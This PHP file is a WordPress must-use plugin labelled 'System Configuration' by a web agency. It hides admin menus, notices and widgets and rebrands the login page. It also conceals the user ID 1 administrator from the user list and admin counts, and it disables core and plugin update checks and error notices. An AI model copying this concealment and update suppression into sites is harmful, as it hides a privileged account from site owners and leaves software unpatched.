<?php
/**
 * Plugin Name: System Configuration
 * Description: (Do not Remove) A must use system configuration preset for the website to be functional correctly. Revision 2023.
 * Author:      eWallz Solutions
 * Version: 1.1.0
 * Author URI: https://www.ewallzsolutions.com/
 * License:     GNU General Public License v3 or later
 * License URI: http://www.gnu.org/licenses/gpl-3.0.html
 */

// Basic security, prevents file from being loaded directly.
defined( 'ABSPATH' ) or die( 'Cheatin&#8217; uh?' );

/* Prefix your custom functions!
 *
 * Function names must be unique in PHP.
 * In order to make sure the name of your function does not
 * exist anywhere else in WordPress, or in other plugins,
 * give your function a unique custom prefix.
 * Example prefix: wpr20151231
 * Example function name: wpr20151231__do_something
 *
 * For the rest of your function name after the prefix,
 * make sure it is as brief and descriptive as possible.
 * When in doubt, do not fear a longer function name if it
 * is going to remind you at once of what the function does.
 * Imagine you’ll be reading your own code in some years, so
 * treat your future self with descriptive naming. ;)
 */


/**
 * Define your custom function here.
 * This example just returns true.
 * 
 * @return bool Boolean value TRUE
 */
 
/* Branda permission fix */
//add_filter( 'branda_permissions_allowed_roles', '__return_empty_array' );

//clear feeds
function my_remove_feeds() {
remove_action( 'wp_head', 'feed_links_extra', 3 );
remove_action( 'wp_head', 'feed_links', 2 );
}
add_action( 'after_setup_theme', 'my_remove_feeds' );
add_filter( 'woocommerce_helper_suppress_admin_notices', '__return_true' );

// Disable WordPress update notification
function remove_core_updates(){
global $wp_version;return(object) array('last_checked'=> time(),'version_checked'=> $wp_version,);
} 
add_filter('pre_site_transient_update_core','remove_core_updates'); //hide updates for WordPress itself
remove_action('load-update-core.php', 'wp_update_plugins');
add_filter('pre_site_transient_update_plugins', '__return_null');
add_filter( 'auto_update_plugin', '__return_false' ); //this will disable all updates

//Disable messages about the mobile apps in WooCommerce emails.
function mtp_disable_mobile_messaging( $mailer ) {
    remove_action( 'woocommerce_email_footer', array( $mailer->emails['WC_Email_New_Order'], 'mobile_messaging' ), 9 );
}
add_action( 'woocommerce_email', 'mtp_disable_mobile_messaging' );

// Remove Emoji & WP Head
remove_action('wp_head', 'wp_generator'); 
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'wp_shortlink_wp_head');
remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
remove_action( 'wp_print_styles', 'print_emoji_styles' ); 
remove_action('personal_options_update', 'send_confirmation_on_profile_email');
// CSS Cleanup
function ew_clientadmin_css() {
    
    global $current_user;
    $user_array = array(1);  // list of user id
    $user_id = get_current_user_id();

    if (!in_array($user_id, $user_array)) {
//    if($user_id != '0') {
      echo '<style>
      #footer-upgrade:before{content:"eWallz Print System ";}
      #wpcode-notice-global-review_request, #wpo_wcpdf_send_emails, #wp-admin-bar-litespeed-menu, #wp-admin-bar-archive, #wp-admin-bar-maintenance_mode, #toplevel_page_brightplugins, #wpcode-metabox-snippets, #postcustom, #woocommerce-product-images, #tagsdiv-product_tag, #fluentsmtp_reports_widget, #contextual-help-link-wrap, .woocommerce-marketing-channels-card, #coupon-root, #woocommerce_dashboard_recent_reviews, #fluentform_stat_widget, #dashboard_activity, #dashboard_site_health, #e-dashboard-overview, #setting-error-tgmpa, .error, .postman-not-configured-notice, #footer-thankyou, a[href*="page=wcbv-order-status-setting"], a[href*="page=wf_woocommerce_packing_list_premium_extension"], a[href*="#freevspro"], a[href*="#documents"], a[href*="#help"], a[href*="page=wf_woocommerce_packing_list_invoice"], a[href*="page=wc-addons"], div.crb-announcement, h2.nav-tab-wrapper, .notice.at-review-notice, .woocommerce-layout__header-wrapper, .banner_after_bulk_print_ipc, .wt_heading_section {display: none !important;}
        </style>';
    }
}
add_action('admin_head', 'ew_clientadmin_css');


//Alt Global admin css
function ew_adminglobal_css() {
    
    global $current_user;
    $user_array = array(0);  // list of user id
    $user_id = get_current_user_id();

    if (!in_array($user_id, $user_array)) {
//    if($user_id != '1') {
      echo '<style>
        /* Hide the existing image */
#wpcode-metabox-snippets, a.components-button.edit-post-fullscreen-mode-close img.edit-post-fullscreen-mode-close_site-icon {
    display: none !important;
}

/* Add Dashicon before the link text */
a.components-button.edit-post-fullscreen-mode-close::before {
    content: "\f341"; /* Unicode for the Dashicons arrow-left-alt icon */
    font-family: "Dashicons";
    margin-top: 10px;
    font-size: 40px;
    vertical-align: middle;
    display: inline-block;
}

        </style>';
    }
}
add_action('admin_head', 'ew_adminglobal_css');

//Rename Woo Dashboard Status
function replaceWoocommerceDashboardText() {
    ?>
    <script>
                document.addEventListener("DOMContentLoaded", function() {
            // Select the woocommerce_dashboard_status div
            var woocommerceDashboardStatus = document.getElementById("woocommerce_dashboard_status");
        
            // Check if the div exists before manipulating it
            if (woocommerceDashboardStatus) {
                // Select the h2 element inside the div
                var h2Element = woocommerceDashboardStatus.querySelector("h2");
        
                // Replace the text of the h2 element
                if (h2Element) {
                    h2Element.textContent = "Store Status";
                }
            }
        });

    </script>
    <?php
}

// Hook the function to the admin_head action to add the script to the admin area
add_action('admin_head', 'replaceWoocommerceDashboardText');


//Remove Dashboard Widgets
function remove_dashboard_widgets() {
    global $wp_meta_boxes;
  
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']);
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_drafts']);
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']);
  
}
  
add_action('wp_dashboard_setup', 'remove_dashboard_widgets' );


//Remove admin menu 

function hide_menu() {

    global $current_user;
    $user_array = array(1);  // list of user id
    $user_id = get_current_user_id();

    if (!in_array($user_id, $user_array)) { // add ! for exclude
//    if($user_id != '1') {
   	 /* MAIN MENU */
	 remove_menu_page( 'edit.php' ); // Dashboard + submenus
	 remove_menu_page( 'edit-comments.php' ); // Dashboard + submenus
   	 remove_menu_page( 'tools.php' ); // WordPress menu
   	 remove_menu_page( 'plugins.php');  // Update 
   	 remove_menu_page( 'wpcode' );  //Media
   	 remove_menu_page( 'upload.php' );    //cerber
   	 remove_menu_page( 'themes.php' );    //cerber
   	 remove_menu_page( 'edit.php?post_type=page' );    //cerber
   	 remove_menu_page( 'woocommerce-marketing' );    //cerber
   	 //remove_menu_page( 'wf_woocommerce_packing_list' );  // Update
	 remove_menu_page( 'ai1wm_export' );  // Update
	 //remove_menu_page( 'wf_woocommerce_packing_list_premium_extension' );  // Update
	 //remove_menu_page( 'wf_woocommerce_packing_list' );  // Update
	 //remove_menu_page( 'wf_woocommerce_packing_list' );  // Update



       	 /* SUBMENU */
    	 remove_submenu_page( 'options-general.php', 'options-reading.php');  // Update 
    	 remove_submenu_page( 'options-general.php', 'options-discussion.php');  // Update 
    	 remove_submenu_page( 'options-general.php', 'options-media.php');  // Update
    	 remove_submenu_page( 'options-general.php', 'options-writing.php');  // Update 
    	 remove_submenu_page( 'options-general.php', 'options-permalink.php');  // Update 
		 remove_submenu_page( 'options-general.php', 'options-privacy.php');  // Update 
    	 remove_submenu_page( 'edit.php?post_type=product', 'product-reviews');  // Update 
    	 //remove_submenu_page( 'users.php', 'user-new.php');  // Update 
    	 //remove_submenu_page( 'upload.php', 'media-new.php');  // Update 
    	 remove_submenu_page( 'options-general.php', 'cfturnstile');
    	 remove_submenu_page( 'options-general.php', 'disable-emails');
    	 remove_submenu_page( 'woocommerce', 'wc-addons');  // Update 
    	 remove_submenu_page( 'woocommerce', 'wc-status');  // Update 
	 	 remove_submenu_page( 'woocommerce', 'wc-admin&path=/extensions');  // Update 
	 	 remove_submenu_page( 'tools.php', 'admin-site-enhancements' ); 
	 	 //remove_submenu_page( 'formidable', 'formidable-styles' ); 
	 	 //remove_submenu_page( 'formidable', 'formidable-smtp' );
		 //remove_submenu_page( 'formidable', 'formidable-inbox' );
	 	 //remove_submenu_page( 'formidable', 'formidable' ); 
    }
}
add_action('admin_head', 'hide_menu');

//Remove menu admin bar
function remove_from_admin_bar($wp_admin_bar) {
    /*
     * Placing items in here will only remove them from admin bar
     * when viewing the front end of the site
    */
    if ( ! is_admin() ) {
        // Example of removing item generated by plugin. Full ID is #wp-admin-bar-si_menu
        //$wp_admin_bar->remove_node('rank-math');
 
        // WordPress Core Items (uncomment to remove)
        //$wp_admin_bar->remove_node('updates');
        //$wp_admin_bar->remove_node('comments');
        //$wp_admin_bar->remove_node('new-content');
        //$wp_admin_bar->remove_node('wp-logo');
        //$wp_admin_bar->remove_node('site-name');
        //$wp_admin_bar->remove_node('my-account');
        //$wp_admin_bar->remove_node('search');
        //$wp_admin_bar->remove_node('customize');
    }
 
    /*
     * Items placed outside the if statement will remove it from both the frontend
     * and backend of the site
    */
    $wp_admin_bar->remove_node('wp-logo');
    //$wp_admin_bar->remove_node('wp-ultimo');
    //$wp_admin_bar->remove_node('et-top-bar-menu');
    //$wp_admin_bar->remove_node('updates');
    //$wp_admin_bar->remove_node('comments');
    //$wp_admin_bar->remove_node('new-content');
    //$wp_admin_bar->remove_node('rank-math');
    //$wp_admin_bar->remove_node('litespeed-menu');
}
add_action('admin_bar_menu', 'remove_from_admin_bar', 999);

//Remove Metaboxes
//remove product-page-post metaboxes
add_action( 'add_meta_boxes' , 'remove_metaboxes', 50 );
function remove_metaboxes() {
    remove_meta_box( 'page_metabox' , 'product' , 'normal' );
    remove_meta_box( 'page_metabox' , 'page' , 'normal' );
    remove_meta_box( 'page_metabox' , 'post' , 'normal' );
    remove_meta_box( 'tsf-inpost-box' , 'page' , 'normal' );
    remove_meta_box( 'tsf-inpost-box' , 'post' , 'normal' );
}


// Disables the block editor from managing widgets in the Gutenberg plugin.
//add_filter( 'gutenberg_use_widgets_block_editor', '__return_false', 100 );

// Disables the block editor from managing widgets. renamed from wp_use_widgets_block_editor
//add_filter( 'use_widgets_block_editor', '__return_false' );

// Disable plugin auto-update email notification
add_filter('auto_plugin_update_send_email', '__return_false');
 
// Disable theme auto-update email notification
add_filter('auto_theme_update_send_email', '__return_false');
//Disable automatic "Your Site Has Been Updated..." emails
add_filter( 'auto_core_update_send_email', 'ewallz_disable_core_update_emails', 10, 4 );
function ewallz_disable_core_update_emails( $send, $type, $core_update, $result ) {
  if ( !empty($type) && $type == 'success' ) {
    return false;
  }
  
  return true;
}

//Exclude SuperAdmin
add_action( 'pre_user_query', 'ew_pre_user_query' );
function ew_pre_user_query( $user_search ) {
    $user = wp_get_current_user();
    if ( $user->ID != 1 ) {
        global $wpdb;
        $user_search->query_where = str_replace( 
            'WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users} . ID<>1", 
            $user_search->query_where 
        );
    }
}

add_filter("views_users", "ew_list_table_views");
function ew_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

// Custom Login Page Setup
add_filter('admin_title', 'ew_admin_title', 10, 2);
function ew_admin_title($admin_title, $title)
{
   return get_bloginfo('name').' &bull; '.$title;
}
function ew_login_title( $login_title ) {
   return str_replace(array( ' &lsaquo;', ' &#8212; WordPress'), array( '
   &bull;', ' Platform'),$login_title );
}
add_filter( 'login_title', 'ew_login_title' );

// Login page Styles
function custom_login_logo() { ?>
<style type="text/css">
#login h1 a, .login h1 a { 
background-image: url(https://user-images.githubusercontent.com/24457765/125164409-aac7ea00-e1c4-11eb-97e9-66422f0f5404.png);
width:auto;
height:80px;
background-size: 300px 80px;
background-repeat: no-repeat;
margin-bottom: 10px;
}
#backtoblog {display: none !important;}
.button-primary {background: #42a522 !important; border-color: #42a522 !important;}
</style>
<?php }
add_action( 'login_enqueue_scripts', 'custom_login_logo' );

//Login logo url
function custom_login_logo_link() { return 'https://www.ewallzsolutions.com'; }
add_filter( 'login_headerurl', 'custom_login_logo_link' );

//Login logo text
function custom_login_logo_text() { return 'Secure Admin Solutions'; }
add_filter( 'login_headertitle', 'custom_login_logo_text' );
